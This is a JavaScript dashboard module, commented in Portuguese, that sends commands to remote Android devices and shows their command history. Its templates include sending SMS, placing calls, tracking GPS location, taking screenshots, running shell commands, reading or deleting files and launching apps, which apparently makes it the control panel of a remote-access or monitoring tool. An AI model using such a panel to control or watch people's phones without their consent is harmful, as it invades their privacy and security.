/**
 * Commands Manager - Gerenciamento dinâmico de comandos
 * Interface para enviar e monitorar comandos em tempo real
 */

class CommandsManager {
    constructor() {
        this.commands = new Map();
        this.commandHistory = [];
        this.commandTemplates = this.getCommandTemplates();
        this.init();
    }

    init() {
        console.log('CommandsManager inicializado');
        
        // Configurar listeners de WebSocket
        this.setupWebSocketListeners();
        
        // Configurar formulário de comandos
        this.setupCommandForm();
        
        // Carregar histórico de comandos
        this.loadCommandHistory();
    }

    /**
     * Configurar listeners do WebSocket
     */
    setupWebSocketListeners() {
        const socket = window.socketManager;

        // Novo comando criado
        socket.on('new_command', (data) => {
            this.handleNewCommand(data);
        });

        // Comando atualizado
        socket.on('command_updated', (data) => {
            this.handleCommandUpdated(data);
        });

        // Comando executado
        socket.on('command_executed', (data) => {
            this.handleCommandExecuted(data);
        });
    }

    /**
     * Configurar formulário de comandos
     */
    setupCommandForm() {
        const form = document.getElementById('command-form');
        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.sendCommand();
            });
        }

        // Tipo de comando
        const commandType = document.getElementById('command-type');
        if (commandType) {
            commandType.addEventListener('change', (e) => {
                this.updateCommandParameters(e.target.value);
            });
        }

        // Templates rápidos
        const quickCommands = document.querySelectorAll('.quick-command');
        quickCommands.forEach(btn => {
            btn.addEventListener('click', (e) => {
                const template = e.target.dataset.template;
                this.loadTemplate(template);
            });
        });
    }

    /**
     * Obtém templates de comandos
     */
    getCommandTemplates() {
        return {
            sms: {
                name: 'Enviar SMS',
                description: 'Envia uma mensagem SMS',
                parameters: [
                    { name: 'number', label: 'Número', type: 'text', required: true },
                    { name: 'message', label: 'Mensagem', type: 'textarea', required: true }
                ]
            },
            call: {
                name: 'Fazer Chamada',
                description: 'Inicia uma chamada telefônica',
                parameters: [
                    { name: 'number', label: 'Número', type: 'text', required: true }
                ]
            },
            location: {
                name: 'Obter Localização',
                description: 'Obtém localização GPS do dispositivo',
                parameters: []
            },
            screenshot: {
                name: 'Capturar Tela',
                description: 'Captura screenshot da tela',
                parameters: []
            },
            shell: {
                name: 'Comando Shell',
                description: 'Executa comando shell no dispositivo',
                parameters: [
                    { name: 'command', label: 'Comando', type: 'text', required: true }
                ]
            },
            file: {
                name: 'Operação de Arquivo',
                description: 'Executa operações em arquivos',
                parameters: [
                    { name: 'action', label: 'Ação', type: 'select', required: true, 
                      options: ['list', 'read', 'delete', 'exists'] },
                    { name: 'path', label: 'Caminho', type: 'text', required: true }
                ]
            },
            app: {
                name: 'Operação de App',
                description: 'Gerencia aplicativos',
                parameters: [
                    { name: 'action', label: 'Ação', type: 'select', required: true,
                      options: ['list', 'launch', 'info'] },
                    { name: 'package', label: 'Pacote', type: 'text', required: false }
                ]
            },
            system: {
                name: 'Comando do Sistema',
                description: 'Comandos do sistema Android',
                parameters: [
                    { name: 'action', label: 'Ação', type: 'select', required: true,
                      options: ['device_info', 'battery_info', 'network_info', 'storage_info', 'vibrate'] },
                    { name: 'duration', label: 'Duração (ms)', type: 'number', required: false }
                ]
            }
        };
    }

    /**
     * Atualiza parâmetros do comando
     */
    updateCommandParameters(commandType) {
        const parametersContainer = document.getElementById('command-parameters');
        if (!parametersContainer) return;

        const template = this.commandTemplates[commandType];
        if (!template) {
            parametersContainer.innerHTML = '<p class="text-muted">Selecione um tipo de comando</p>';
            return;
        }

        parametersContainer.innerHTML = `
            <div class="alert alert-info">
                <strong>${template.name}</strong><br>
                ${template.description}
            </div>
            ${template.parameters.map(param => this.renderParameter(param)).join('')}
        `;
    }

    /**
     * Renderiza campo de parâmetro
     */
    renderParameter(param) {
        let input = '';
        
        switch (param.type) {
            case 'select':
                input = `
                    <select class="form-control" name="param_${param.name}" ${param.required ? 'required' : ''}>
                        <option value="">Selecione...</option>
                        ${param.options.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
                    </select>
                `;
                break;
                
            case 'textarea':
                input = `
                    <textarea class="form-control" name="param_${param.name}" rows="3" 
                              ${param.required ? 'required' : ''}></textarea>
                `;
                break;
                
            default:
                input = `
                    <input type="${param.type}" class="form-control" name="param_${param.name}" 
                           ${param.required ? 'required' : ''}>
                `;
        }

        return `
            <div class="mb-3">
                <label class="form-label">${param.label}${param.required ? ' *' : ''}</label>
                ${input}
            </div>
        `;
    }

    /**
     * Envia comando
     */
    async sendCommand() {
        const deviceId = this.getSelectedDeviceId();
        if (!deviceId) {
            window.notificationSystem.error('Selecione um dispositivo primeiro');
            return;
        }

        const commandType = document.getElementById('command-type')?.value;
        if (!commandType) {
            window.notificationSystem.error('Selecione um tipo de comando');
            return;
        }

        // Coletar parâmetros
        const parameters = {};
        document.querySelectorAll('[name^="param_"]').forEach(input => {
            const paramName = input.name.replace('param_', '');
            parameters[paramName] = input.value;
        });

        // Prioridade
        const priority = document.getElementById('command-priority')?.value || 'normal';

        const commandData = {
            device_id: deviceId,
            command_type: commandType,
            data: parameters,
            priority: priority
        };

        try {
            const response = await window.apiClient.post('/command', commandData);
            
            window.notificationSystem.success(
                `Comando ${commandType} enviado com sucesso! ID: ${response.command_id}`
            );
            
            // Limpar formulário
            this.resetCommandForm();
            
            // Atualizar histórico
            this.loadCommandHistory();
            
        } catch (error) {
            console.error('Erro ao enviar comando:', error);
            window.notificationSystem.error('Erro ao enviar comando');
        }
    }

    /**
     * Carrega template de comando
     */
    loadTemplate(templateName) {
        const commandType = document.getElementById('command-type');
        if (commandType) {
            commandType.value = templateName;
            this.updateCommandParameters(templateName);
        }
    }

    /**
     * Reseta formulário de comando
     */
    resetCommandForm() {
        const form = document.getElementById('command-form');
        if (form) {
            form.reset();
            this.updateCommandParameters('');
        }
    }

    /**
     * Obtém ID do dispositivo selecionado
     */
    getSelectedDeviceId() {
        // Tentar obter do seletor
        const deviceSelect = document.getElementById('target-device');
        if (deviceSelect) {
            return deviceSelect.value;
        }
        
        // Tentar obter do dispositivo selecionado no DevicesManager
        if (window.devicesManager && window.devicesManager.selectedDevice) {
            return window.devicesManager.selectedDevice;
        }
        
        // Tentar obter da sessão
        return sessionStorage.getItem('selected_device');
    }

    /**
     * Carrega histórico de comandos
     */
    async loadCommandHistory() {
        try {
            // Implementar busca de comandos
            // Por enquanto, usar dados do estado global
            const commands = window.appState?.state?.commands || [];
            
            this.renderCommandHistory(commands);
        } catch (error) {
            console.error('Erro ao carregar histórico de comandos:', error);
        }
    }

    /**
     * Renderiza histórico de comandos
     */
    renderCommandHistory(commands) {
        const container = document.getElementById('command-history');
        if (!container) return;

        if (commands.length === 0) {
            container.innerHTML = '<p class="text-muted">Nenhum comando no histórico</p>';
            return;
        }

        container.innerHTML = `
            <div class="table-responsive">
                <table class="table table-hover">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Dispositivo</th>
                            <th>Tipo</th>
                            <th>Status</th>
                            <th>Criado</th>
                            <th>Ações</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${commands.map(cmd => this.renderCommandRow(cmd)).join('')}
                    </tbody>
                </table>
            </div>
        `;
    }

    /**
     * Renderiza linha de comando
     */
    renderCommandRow(command) {
        const statusBadge = this.getStatusBadge(command.status);
        const createdAt = window.utils.formatRelativeTime(command.created_at);

        return `
            <tr data-command-id="${command.command_id}">
                <td><code>${command.command_id.substring(0, 8)}...</code></td>
                <td>${command.device_id?.substring(0, 8)}...</td>
                <td><span class="badge bg-secondary">${command.command_type}</span></td>
                <td>${statusBadge}</td>
                <td>${createdAt}</td>
                <td>
                    <button class="btn btn-sm btn-info view-command" data-command-id="${command.command_id}">
                        Ver
                    </button>
                    ${command.status === 'pending' ? `
                        <button class="btn btn-sm btn-warning cancel-command" data-command-id="${command.command_id}">
                            Cancelar
                        </button>
                    ` : ''}
                </td>
            </tr>
        `;
    }

    /**
     * Obtém badge de status
     */
    getStatusBadge(status) {
        const badges = {
            'pending': '<span class="badge bg-warning">Pendente</span>',
            'sent': '<span class="badge bg-info">Enviado</span>',
            'executed': '<span class="badge bg-success">Executado</span>',
            'failed': '<span class="badge bg-danger">Falhou</span>',
            'cancelled': '<span class="badge bg-secondary">Cancelado</span>'
        };
        return badges[status] || '<span class="badge bg-secondary">Desconhecido</span>';
    }

    /**
     * Manipula novo comando
     */
    handleNewCommand(data) {
        console.log('Novo comando:', data);
        this.loadCommandHistory();
    }

    /**
     * Manipula comando atualizado
     */
    handleCommandUpdated(data) {
        console.log('Comando atualizado:', data);
        
        // Atualizar na lista
        const row = document.querySelector(`[data-command-id="${data.command_id}"]`);
        if (row) {
            const statusCell = row.querySelector('td:nth-child(4)');
            if (statusCell) {
                statusCell.innerHTML = this.getStatusBadge(data.status);
            }
        }
        
        window.notificationSystem.info(
            `Comando ${data.command_id.substring(0, 8)} atualizado: ${data.status}`
        );
    }

    /**
     * Manipula comando executado
     */
    handleCommandExecuted(data) {
        console.log('Comando executado:', data);
        
        window.notificationSystem.success(
            `✅ Comando ${data.command_id.substring(0, 8)} executado com sucesso`
        );
        
        this.loadCommandHistory();
    }

    /**
     * Comandos rápidos predefinidos
     */
    quickCommands = {
        getLocation: {
            type: 'location',
            name: 'Obter Localização',
            icon: '📍'
        },
        getBattery: {
            type: 'system',
            name: 'Info Bateria',
            icon: '🔋',
            data: { action: 'battery_info' }
        },
        getDeviceInfo: {
            type: 'system',
            name: 'Info Dispositivo',
            icon: '📱',
            data: { action: 'device_info' }
        },
        vibrate: {
            type: 'system',
            name: 'Vibrar',
            icon: '📳',
            data: { action: 'vibrate', duration: 500 }
        },
        listApps: {
            type: 'app',
            name: 'Listar Apps',
            icon: '📦',
            data: { action: 'list' }
        }
    };

    /**
     * Envia comando rápido
     */
    async sendQuickCommand(quickCommandName) {
        const deviceId = this.getSelectedDeviceId();
        if (!deviceId) {
            window.notificationSystem.error('Selecione um dispositivo primeiro');
            return;
        }

        const quickCmd = this.quickCommands[quickCommandName];
        if (!quickCmd) {
            window.notificationSystem.error('Comando rápido não encontrado');
            return;
        }

        const commandData = {
            device_id: deviceId,
            command_type: quickCmd.type,
            data: quickCmd.data || {},
            priority: 'high'
        };

        try {
            const response = await window.apiClient.post('/command', commandData);
            window.notificationSystem.success(`${quickCmd.icon} ${quickCmd.name} enviado!`);
        } catch (error) {
            console.error('Erro ao enviar comando rápido:', error);
            window.notificationSystem.error('Erro ao enviar comando rápido');
        }
    }
}

// Inicializar quando DOM estiver pronto
document.addEventListener('DOMContentLoaded', () => {
    window.commandsManager = new CommandsManager();
});

